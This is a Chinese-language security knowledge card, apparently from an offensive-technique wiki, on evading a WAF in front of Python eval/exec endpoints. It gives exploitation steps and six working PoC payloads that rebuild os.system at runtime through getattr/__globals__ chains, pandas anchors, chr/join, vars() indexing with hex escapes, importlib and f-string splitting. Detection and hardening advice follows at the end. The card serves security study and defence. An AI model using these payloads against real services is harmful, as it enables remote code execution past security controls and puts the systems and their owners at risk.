---
id: web-python-waf-bypass-dynamic-attribute-keyword-split
title: Python 代码执行 WAF 绕过：关键字拆分与动态属性构造
type: scenario
domain: web
path: web/python
technique: python-waf-keyword-attribute-bypass
tags:
- python
- waf-bypass
- rce
- getattr
- importlib
- f-string
- evasion
- safeline
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:33:40+08:00'
  notes: 已对照原文与截图 06-11、14 核对：payload 4/5/7/8/9/12 在雷池 9.3.3 个人版均返回 Verification passed，payload 1-3 被拦截的对照也一致；getattr(lambda)__globals__、pandas 锚点、vars 索引、importlib+__getattribute__、chr/join、f-string 拆分的原理与 PoC 无误；未验证点：仅在原文雷池个人版环境验证，跨厂商表显示差异，不能外推
url: /docs/web/python/web-python-waf-bypass-dynamic-attribute-keyword-split/
draft: false
kb_aliases:
- Python WAF 绕过
- getattr __globals__ 绕过
- vars 字典索引绕过
- importlib __getattribute__
- f-string 拆分绕过
- chr join 构造函数名
---

## 一句话结论

当 Python 后端存在 `eval`/`exec` 类代码执行入口且前置 WAF 只做字符串正则/浅层语义匹配时，可用字符串拼接、`getattr` 自省链、`vars()` 字典索引、`importlib` + `__getattribute__`、`chr()` 重组、f-string 拆分等方式在运行期构造出 `os.system`，使请求原文不出现敏感连续字符串而绕过拦截。

## 原理

- WAF 检测的是请求原文中的连续特征：`import os`、`__builtins__`、`system(`、`os.system`（点号连接）、`eval` 等；Python 在运行期才求值，因此只要最终对象图一致、原文不含特征，就能执行。
- 函数对象（包括 `lambda`）持有 `__globals__`，指向定义时的全局命名空间；`lambda:0` 作为锚点，`getattr(f,'__globals__')['__builtins__']` 可取到内建命名空间，再取 `__import__`，全程不出现 `__builtins__` 连续字面量。
- 利用业务已加载的第三方库（如 `pd` 代表 pandas）作锚点：`getattr(pd,'__builtins__')` 同样可达内建空间；WAF 常对业务库白名单/降权，敏感度更低。
- `vars(module)['system']` 把属性访问改成字典索引，破坏 `os.system` 的点号正则；`importlib.import_module()` 替代 `import` 关键字，`__getattribute__()` 替代 `getattr`，进一步降低指纹。
- `chr(115)+chr(121)+...` 或 `f"{'s'}{'y'}{'s'}{'t'}{'e'}{'m'}"` 把敏感函数名拆成单字符，静态看只是字符/独立表达式，运行期才拼成 `system`。
- 仅做简单字符串拼接 + `eval`（如 `e=eval; p='__im'+'port__'`）仍可能被语义/XSS 规则命中；成功案例是把“入口函数获取”和“敏感名构造”拆到多个维度同时规避。

## 触发条件

- 目标 Python 服务存在用户可控的 `eval`/`exec`/`compile` 代码执行入口（如在线代码校验、表达式计算、策略脚本）。
- 前置 WAF（原文为雷池 SafeLine 9.3.3 个人版）以正则/关键字/浅层语义为主，未做完整 AST 白名单或运行时沙箱。
- WAF 未对请求体做等价归一化（Unicode/转义/拼接还原）后再检测。
- 攻击者已确认入口可达（先发无害 `w` 等低特征命令测试）。

## 利用步骤

1. 用最简 payload 确认入口与拦截点：`import os; os.system("w")`，观察是否被 `system(` 规则拦截。
2. 尝试字符串拼接 + `eval`，确认是否被 `eval`/语义规则拦截。
3. 改用 `getattr(lambda:0,'__globals__')['__builtins__']['__import__']` 链获取导入函数，避开 `__builtins__` 字面量。
4. 或改用业务库锚点 `getattr(pd,'__builtins__')`，降低业务白名单的敏感度。
5. 用 `chr()+join()`、f-string 或 `vars()` 字典索引构造 `system`，避免 `system(`、`os.system` 连续特征。
6. 发送后观察响应；原文测试返回 `200 Verification passed! Code executed successfully.` 即成功。

## PoC

以下均在原文雷池 9.3.3 个人版 + QuantDinger 2.2.2 环境返回 200 成功（命令统一用 `w` 降低特征）：

```python
# 1) getattr + lambda.__globals__ 自省链，字符串拆分敏感名
g=getattr; gb='__glob'+'als__'; bi='__buil'+'tins__'; im='__im'+'port__'
b=g(lambda:0,gb)[bi]
i=b[im] if isinstance(b,dict) else g(b,im)
i('o'+'s').system('w')
```

```python
# 2) 业务库 pandas 作锚点
g=getattr; bk='__buil'+'tins__'; b=g(pd,bk); ik='__im'+'port__'
i=b[ik] if isinstance(b,dict) else g(b,ik)
g(i('o'+'s'),'sys'+'tem')('w')
```

```python
# 3) chr + join 构造 system
import os
getattr(os, ''.join([chr(115),chr(121),chr(115),chr(116),chr(101),chr(109)]))(chr(119))
```

```python
# 4) vars() 字典索引 + 十六进制转义，破坏 os.system 点号特征
i=__import__('\x6f\x73')
vars(i)['\x73\x79\x73\x74\x65\x6d']('\x77')
```

```python
# 5) importlib + __getattribute__，避开 import/getattr 关键词
import importlib as i
m=i.import_module('\x6f\x73')
m.__getattribute__('\x73\x79\x73\x74\x65\x6d')('\x77')
```

```python
# 6) f-string 把 system 拆成单字符，运行期拼接
c=f"{'s'}{'y'}{'s'}{'t'}{'e'}{'m'}"
getattr(__import__('os'), c)('w')
```

## 变体与关联

- 变体：把上述手法组合使用（如先 Unicode 斜体 + f-string + getattr），可进一步降低单点被规则命中的概率。
- 变体：`__builtins__` 在不同上下文可能是 dict 或 module，payload 中用 `isinstance(b,dict)` 分支兼容两种形态。
- 关联：编码层绕过（base64、NFKC Unicode、零宽字符、Latin-1 字节流）见下一张卡；两者可叠加。
- 关联卡片：[[web-python-waf-bypass-encoding-unicode-normalization]]

## 检测与防御

- 检测：请求体中出现 `getattr`、`__globals__`、`__builtins__`、`__import__`、`__getattribute__`、`vars(`、`chr(` 与 `join` 的组合。
- 检测：代码执行接口的输入包含大量单字符表达式/字符串拼接、十六进制转义、f-string 片段。
- 检测：同一来源短时间内多次提交语义等价但文本不同的 payload（WAF 绕过试探）。
- 修复：不要用正则黑名单做代码执行防护；对必须支持的表达式使用 AST 白名单（只允许字面量、算术、白名单函数），禁止 `eval`/`exec` 任意输入。
- 加固：把代码执行放入独立低权限容器/沙箱，限制文件、进程、网络；WAF 先做归一化（Unicode NFKC、转义解码）再做语法级检测。
- 注意：原文跨厂商对比显示同一 payload 在不同 WAF 上结果差异很大（部分厂商对 payload 4/6/7 仍拦截），不能把单厂商结果当成通用绕过。
